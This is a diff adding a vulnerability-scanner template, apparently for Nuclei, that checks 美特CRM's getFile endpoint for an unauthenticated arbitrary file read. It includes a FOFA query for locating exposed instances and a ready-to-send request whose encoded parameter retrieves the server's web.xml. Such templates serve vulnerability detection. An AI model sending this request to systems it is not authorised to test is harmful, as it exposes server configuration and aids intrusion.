@@ -1,0 +1,33 @@
+id: meiteCRM-getFile-File-reading
+
+info:
+  name: 美特CRM getFile 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="/common/scripts/basic.js"
+    美特CRM getFile 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
+  reference:
+    - https://mp.weixin.qq.com/s/r7HSVRe2Ypmi71T3TUMmxg
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /getFile?p=b9998b5475349fb121bb1c747c459f55427b7cbfdb484a28fbd4d9d992ab442923a2d0e2c189c9bae4c35e342dbb652c0711d79544ffef547bdbda75a26a27c6 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '<context-param>'
+          - '</context-param>'
+        condition: and
+      - type: status
+        status: 
+          - 200
